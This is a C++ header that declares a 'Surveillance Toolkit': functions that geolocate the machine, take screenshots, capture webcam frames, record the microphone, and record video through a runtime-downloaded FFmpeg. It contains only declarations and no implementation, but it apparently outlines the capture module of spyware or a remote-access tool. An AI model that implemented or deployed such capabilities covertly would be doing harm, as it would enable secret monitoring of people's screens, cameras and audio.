#pragma once
#include <string>
#include <vector>

// --- Phase 2: Surveillance Toolkit ---

// 1. Geolocation: Returns formatted string with IP, Country, City, Coordinates
std::string get_location();

// 2. Screenshot: Captures screen to a temp .bmp file, returns filepath
std::string take_screenshot();

// 3. Webcam: Captures single frame from default camera to temp .bmp, returns filepath
std::string take_webcam_photo();

// 4. Microphone: Records audio for specified seconds to temp .wav, returns filepath
std::string record_audio(int seconds);

// 5. Video (FFmpeg wrapper): Downloads FFmpeg dynamically and records video
// mode: "cam" or "screen"
std::string record_video(int seconds, const std::string& mode);

// 6. AV Sync (FFmpeg wrapper): Records video and audio together
// mode: "normal" or "full" (stereo mix)
std::string record_av(int seconds, const std::string& mode);
